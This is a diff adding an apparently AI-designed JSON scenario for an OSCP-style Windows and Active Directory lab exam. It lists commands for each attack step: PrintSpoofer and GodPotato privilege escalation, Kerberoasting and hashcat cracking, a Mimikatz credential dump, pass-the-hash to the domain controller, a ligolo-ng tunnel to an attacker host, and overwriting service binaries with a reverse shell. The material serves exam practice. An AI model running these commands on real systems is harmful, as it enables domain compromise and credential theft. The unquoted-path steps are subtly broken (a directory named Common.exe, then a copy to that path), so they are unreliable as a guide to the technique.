@@ -1,0 +1,181 @@
+{
+  "id": "the-windows-heavy-exam",
+  "title": "The Windows Heavy Exam",
+  "category": "exam-simulation",
+  "source": ["AI-designed"],
+  "designed_by": "ai-composite",
+  "description": "3 AD (standard) + 3 Windows standalone with diverse privesc: PrintSpoofer, GodPotato, service hijack, unquoted path, token theft. 6 machines, 2 networks, all Windows, AD, pivot.",
+
+  "introduction": "Windows-heavy exams test diverse privesc—potatoes, service hijack, unquoted path. This scenario ensures you recognize each pattern.",
+  "mental_model": "Think: winPEAS first, then match output to technique. SeImpersonate→potato; writable binary→hijack; unquoted path→interception.",
+  "key_principles": [
+    "winPEAS reveals privesc vector quickly",
+    "icacls for writable service binaries",
+    "wmic service for unquoted path check",
+    "Match potato to OS version",
+    "Kerberoast for MSSQL service accounts"
+  ],
+
+  "indicators": {
+    "difficulty": 6,
+    "cognitive_load": 5,
+    "enumeration_depth": 5,
+    "rabbit_hole_risk": 4,
+    "time_pressure": 6
+  },
+
+  "mitre": {
+    "tactics": ["TA0001", "TA0003", "TA0004", "TA0006", "TA0007"],
+    "techniques": [
+      {"id": "T1134.001", "name": "Token Impersonation/Theft"},
+      {"id": "T1574.009", "name": "Path Interception: Path Environment Variable"},
+      {"id": "T1543.003", "name": "Create or Modify System Process: Windows Service"},
+      {"id": "T1078", "name": "Valid Accounts"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4b-Win-PrivEsc", "T5-Credentials", "T6-Pivoting", "T7-Lateral"],
+
+  "environment": {
+    "machine_count": 6,
+    "network_count": 2,
+    "os_distribution": {"windows": 6, "linux": 0},
+    "has_ad": true,
+    "has_pivoting": true,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "printspoofer", "godpotato", "service-hijack",
+    "unquoted-path", "winpeas", "seimpersonate"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": true,
+    "pen200_modules": [6, 12, 16, 17, 18, 22],
+    "pattern_frequency": "medium",
+    "recommended_order": 17
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "192.168.40.0/24", "label": "External"},
+    {"id": "internal", "cidr": "10.10.55.0/24", "label": "AD Internal"}
+  ],
+
+  "machines": [
+    {
+      "id": "ad-win1",
+      "label": "AD-WIN1",
+      "ip": "192.168.40.10",
+      "os": "Windows",
+      "role": "AD Entry (dual-NIC)",
+      "networks": ["external", "internal"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 192.168.40.10 -u svc_win -p '<password>'"]},
+        {"port": 445, "name": "SMB", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "svc_win", "to": "SYSTEM", "technique": "PrintSpoofer", "commands": ["PrintSpoofer64.exe -i -c cmd"]}],
+      "credentials": [{"user": "sql_svc", "type": "password", "source": "Kerberoasting", "unlocks": ["ad-win2"]}],
+      "alternatives": []
+    },
+    {
+      "id": "ad-win2",
+      "label": "AD-WIN2",
+      "ip": "10.10.55.11",
+      "os": "Windows",
+      "role": "AD Member",
+      "networks": ["internal"],
+      "services": [
+        {"port": 1433, "name": "MSSQL", "version": "", "vulnerabilities": [{"type": "auth", "summary": "MSSQL with sql_svc", "leads_to": "xp_cmdshell"}], "commands": ["impacket-mssqlclient domain/sql_svc:'<password>'@10.10.55.11 -windows-auth"]},
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "pth", "summary": "PtH with admin", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "sql_svc", "to": "SYSTEM", "technique": "GodPotato", "commands": ["GodPotato-NET4.exe -cmd \"cmd /c whoami\""]}],
+      "credentials": [{"user": "Administrator", "type": "ntlm-hash", "source": "Mimikatz", "unlocks": ["dc-win"]}],
+      "alternatives": []
+    },
+    {
+      "id": "dc-win",
+      "label": "DC-WIN",
+      "ip": "10.10.55.5",
+      "os": "Windows",
+      "role": "Domain Controller",
+      "networks": ["internal"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "pth", "summary": "PtH with DA", "leads_to": "domain-admin"}], "commands": ["evil-winrm -i 10.10.55.5 -u Administrator -H '<hash>'"]},
+        {"port": 389, "name": "LDAP", "version": "", "vulnerabilities": [], "commands": []}
+      ],
+      "privesc": [],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "win-print",
+      "label": "WIN-PRINT",
+      "ip": "192.168.40.20",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Weak creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 192.168.40.20 -u iis_user -p '<password>'"]},
+        {"port": 80, "name": "HTTP", "version": "IIS", "vulnerabilities": [{"type": "rce", "summary": "Web shell", "leads_to": "iis_user"}], "commands": []}
+      ],
+      "privesc": [{"from": "iis_user", "to": "SYSTEM", "technique": "PrintSpoofer", "commands": ["PrintSpoofer64.exe -i -c cmd"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "win-service",
+      "label": "WIN-SERVICE",
+      "ip": "192.168.40.21",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 192.168.40.21 -u svc_app -p '<password>'"]},
+        {"port": 445, "name": "SMB", "version": "", "vulnerabilities": [{"type": "auth", "summary": "SMB", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "svc_app", "to": "SYSTEM", "technique": "Service binary hijack", "commands": ["winpeas.exe", {"cmd": "icacls 'C:\\Program Files\\MyApp\\'", "rationale": "Why: Check if we can overwrite service binary"}, "copy rev.exe 'C:\\Program Files\\MyApp\\MyService.exe'", "sc stop MyService", "sc start MyService"]}],
+      "credentials": [],
+      "alternatives": []
+    },
+    {
+      "id": "win-path",
+      "label": "WIN-PATH",
+      "ip": "192.168.40.22",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {"port": 5985, "name": "WinRM", "version": "", "vulnerabilities": [{"type": "auth", "summary": "Given creds", "leads_to": "local-user"}], "commands": ["evil-winrm -i 192.168.40.22 -u dev -p '<password>'"]},
+        {"port": 3389, "name": "RDP", "version": "", "vulnerabilities": [{"type": "auth", "summary": "RDP", "leads_to": "local-user"}], "commands": []}
+      ],
+      "privesc": [{"from": "dev", "to": "SYSTEM", "technique": "Unquoted service path", "commands": [{"cmd": "wmic service get name,pathname", "rationale": "Why: Find unquoted path for path interception"}, "mkdir 'C:\\Program Files\\Vulnerable App\\Common.exe'", "copy rev.exe 'C:\\Program Files\\Vulnerable App\\Common.exe'", "sc stop VulnService", "sc start VulnService"]}],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [
+    {"from": "ad-win1", "to": "ad-win2", "technique": "Ligolo-ng pivot + Kerberoast", "requires": "SYSTEM on AD-WIN1 (dual-NIC)", "pivot": "AD-WIN1 dual-NIC", "path_ids": ["path-ad"], "commands": [
+      {"cmd": "ligolo-ng agent -connect <kali>:11601 -ignore-cert", "rationale": "Why: Pivot to internal network for Kerberoast/MSSQL"},
+      "# On Kali proxy: session → ifconfig → ip route add 10.10.55.0/24 dev ligolo",
+      {"cmd": "impacket-GetUserSPNs domain/svc_win:'<password>' -dc-ip 10.10.55.5 -request", "rationale": "Why: Kerberoast MSSQL SPN for next-hop creds"},
+      "hashcat -m 13100 hash.txt rockyou.txt",
+      "impacket-mssqlclient domain/sql_svc:'<cracked>'@10.10.55.11 -windows-auth"
+    ]},
+    {"from": "ad-win2", "to": "dc-win", "technique": "Pass-the-Hash with DA NTLM", "requires": "DA hash from Mimikatz on AD-WIN2", "pivot": "AD-WIN1", "path_ids": ["path-ad"], "commands": [
+      "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+      "evil-winrm -i 10.10.55.5 -u Administrator -H '<ntlm_hash>'"
+    ]}
+  ],
+
+  "attack_paths": [
+    {"id": "path-ad", "name": "AD: Standard Chain", "color": "#6bb8cc", "steps": ["ad-win1", "ad-win2", "dc-win"], "description": "Given creds → PrintSpoofer → Kerberoast → MSSQL → GodPotato → DA"},
+    {"id": "path-print", "name": "WIN-PRINT: PrintSpoofer", "color": "#e8a87c", "steps": ["win-print"], "description": "IIS → PrintSpoofer"},
+    {"id": "path-service", "name": "WIN-SERVICE: Service Hijack", "color": "#85e89d", "steps": ["win-service"], "description": "Writable service binary"},
+    {"id": "path-path", "name": "WIN-PATH: Unquoted Path", "color": "#d2a8ff", "steps": ["win-path"], "description": "Unquoted service path"}
+  ]
+}
